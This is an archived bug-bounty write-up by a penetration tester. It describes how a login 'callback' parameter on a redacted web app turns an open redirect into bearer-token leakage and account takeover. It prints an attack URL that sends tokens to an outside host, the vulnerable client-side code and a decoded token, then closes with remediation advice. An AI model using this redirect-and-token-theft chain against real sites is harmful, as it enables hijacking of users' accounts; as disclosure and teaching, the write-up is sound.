# From Open Redirect to Account Takeover

- **Source URL:** https://medium.com/@konqi/from-open-redirect-to-account-takeover-a-real-world-case-5475e42cde6e?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250716022158/https://medium.com/@konqi/from-open-redirect-to-account-takeover-a-real-world-case-5475e42cde6e?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/10190 (id 10190)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# 🔑 🔥 From Open Redirect to Account Takeover: A Real-World case

# Introduction

As a penetration tester, you often come across open redirects, and usually, there is not much you can do with them. Most of the time, the impact is limited to untrusted redirects with potential phishing attacks.

But this time, it was different.

While observing the app, I visited a protected page and was redirected to the authentication subdomain to confirm my identity.

I noticed that the website uses the GET callback parameter in the login form, and I thought it was used as usual for the redirect-back to the initial page after a successful login.

I was ready to add my note to the notepad about the regular open redirect finding and move on when I saw that after the proof-of-concept redirect to google.com, the application also attached my authentication bearer token as a GET parameter to it.

So the URL looked like

`https://google.com/?account_id=1473&token=eyJhY2Nlc3MtdG9rZW4iOiI5Qzd6OENCaU9YcHhUbkZm..`
It appears that the application uses the **callback** parameter for authentication across subdomains. After a successful login process, it redirects you back to the initial subdomain from the callback parameter and attaches your Authentication Bearer token to it.

# Attack Scenario

So the attack scenario would look like this:

Send an authentication URL to the victim with the callback parameter pointing to an attacker-controlled domain, and after the successful authentication, save the victim’s token and redirect them back to the website.

But it turns out that the attack scenario is even easier because if the user is already authenticated and you send them a login form URL with the callback parameter, the application will perform the redirect anyway and will also attach the victim’s authentication token to it. A total disaster in terms of application design.

`https://app.redacted.com/app/login?callback=https://sniffer.io/`
# Vulnerable Code Snippet

Here’s the real vulnerable code snippet. As you can see, everything happens client-side.

```
login: function(e, t) {
     var n = t.ssoAccountId,
      r = t.ssoConversationId,
      a = t.callback,
      i = Dt(t, ["ssoAccountId", "ssoConversationId", "callback"]);
     return new Promise((function(e, t) {
      Rt.a.login(i).then(function() {
       var t = yt(regeneratorRuntime.mark((function t(i) {
        var o, s, l, c, u, E, d, T, A, p;
        return regeneratorRuntime.wrap((function(t) {
         for (;;) switch (t.prev = t.next) {
          case 0:
           if (Object(g.c)(), xt.identify(null === i || void 0 === i || null === (o = i.data) || void 0 === o ? void 0 : o.id, {
             name: null === i || void 0 === i || null === (s = i.data) || void 0 === s ? void 0 : s.name,
             email: null === i || void 0 === i || null === (l = i.data) || void 0 === l ? void 0 : l.email
            }), !a) {
            t.next = 17;
            break
           }
           if (c = i.data, u = c.accounts, E = c.account_id, !(u.length > 0)) {
            t.next = 15;
            break
           }
           return t.next = 7, Rt.a.getAuthData();
          case 7:
           
```
```
//simplified
a = t.callback,
d = t.sent, 
T = d.authorization, 
A = new URL(a), 
(p = new URLSearchParams(A.search)).append("account_id", E), 
p.append("token", T.replace("Bearer ", "")), 
A.search = p.toString(), 
window.location = A.toString();
```
# Using the Token

After receiving my own authentication token through the redirect, I tried to base64 decode and use it.

`eyJhY2Nlc3MtdG9rZW4iOiJDNklqeTVjZ1hGQkR3ZGxyNWNlYmZnIiwidG9rZW4tdHlwZSI6IkJlYXJlciIsImNsaWVudCI6IkhYMEtmVVk3OHAyMndwMDBkeDdTM3ciLCJleHBpcnkiOiIxNzI0NDk2MDE4IiwidWlkIjoicGVudGVzdDEzMzdrQHByb3Rvbi5tZSJ9==````
{
  "access-token": "C6Ijy5cgXFBDwdlr5cebfg",
  "token-type": "Bearer",
  "client": "HX0KfUY78p22wp00dx7S3w",
  "expiry": "1724496018",
  "uid": "pentest1337k@proton.me"
}
```
So here you can see that the application uses a couple of fields for authenticated HTTP requests. We just need to send them in the request headers, and account takeover is pretty much done!

# Conclusion

This case highlights the potential dangers of open redirects when combined with poor token handling practices.

To avoid open redirect vulnerabilities and token leaks, make sure to:

1. **Strictly validate redirect destinations**, using an allowlist of trusted domains or exact endpoint paths.
2. **Never expose authentication tokens in URLs** (GET parameters) — they can be logged, cached, or leaked. Use secure HTTP headers for token transmission instead.
3. Implement token binding, tying tokens to client context (IP, user-agent) to make them harder to reuse if intercepted.
